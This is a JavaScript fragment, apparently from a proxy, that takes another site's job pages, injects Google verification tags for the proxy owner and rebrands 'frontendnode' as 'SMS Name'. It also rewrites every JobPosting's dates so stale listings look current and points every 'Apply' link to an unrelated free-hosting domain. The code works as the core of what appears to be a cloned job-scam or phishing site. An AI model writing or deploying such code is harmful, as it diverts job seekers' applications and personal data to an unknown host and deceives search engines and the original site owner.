if (contentType.includes("text/html")) {
  let body = rewriteText(await response.text());

  // Inject Google Search Console verification
  body = body.replace(
    "<head>",
    `<head>\n<meta name="google-site-verification" content="oOB4GFrNSNdykfLPFYsy8byFMtrbAiccGJfrX7_UcOU" />\n
    <meta name="google-site-verification" content="VJ48HUxQLww3EF1mkdLMVQtOWdg4utrlvjuTNZFVtt4" />\n
    <meta name="google-site-verification" content="JqfbWOtDwfHxjOKb-QvPe_S9B4b-Jtp6zpDjNUWhg1w" />`
  );

  // Update JobPosting schema dates
  body = body.replace(
    /<script[^>]*type="application\/ld\+json"[^>]*>([\s\S]*?)<\/script>/gi,
    (match, json) => {
      try {
        const schema = JSON.parse(json);
        const update = (obj) => {
          if (!obj || typeof obj !== "object") return obj;
          if (Array.isArray(obj)) return obj.map(update);
          if (obj["@type"] === "JobPosting") {
            obj["datePosted"] = "2026-05-06";
            obj["validThrough"] = "2026-12-31";
          }
          Object.keys(obj).forEach((k) => { obj[k] = update(obj[k]); });
          return obj;
        };
        return `<script type="application/ld+json">${JSON.stringify(update(schema))}</script>`;
      } catch {
        return match;
      }
    }
  );

  // Rewrite Apply Now button destination
  body = body.replace(
    /href="([^"]*\/pages\/apply[^"]*)"/gi,
    'href="https://as.rfstore.42web.io/pages/apply"'
  );

  // Rewrite site name to SMS Name
  body = body
    .replace(/<title>([^<]*)<\/title>/gi, (m, t) =>
      `<title>${t.replace(/frontendnode/gi, "SMS Name")}</title>`
    )
    .replace(/(content="[^"]*?)frontendnode([^"]*")/gi, "$1SMS Name$2")
    .replace(/frontendnode/gi, "SMS Name");

  res.setHeader("content-type", "text/html; charset=utf-8");
  return res.status(response.status).send(body);
}
